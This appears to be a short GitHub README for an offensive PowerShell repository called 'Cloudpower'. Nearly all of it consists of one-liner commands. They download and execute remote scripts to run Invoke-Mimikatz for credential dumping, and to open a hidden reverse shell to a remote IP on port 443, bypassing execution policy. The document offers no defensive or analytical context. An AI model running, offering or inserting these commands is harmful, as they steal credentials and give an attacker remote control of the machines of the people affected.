# Cloudpower
test for interest


# Help for Invoke-mimi:
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/Invoke-mimi.ps1'); Invoke-Mimikatz



# Help for rev.ps1:
winx86:

powrshell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/rev.ps1'); rev -ip 4.4.4.4 -port 443"

winx64:

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/rev.ps1'); rev -ip 4.4.4.4 -port 443"
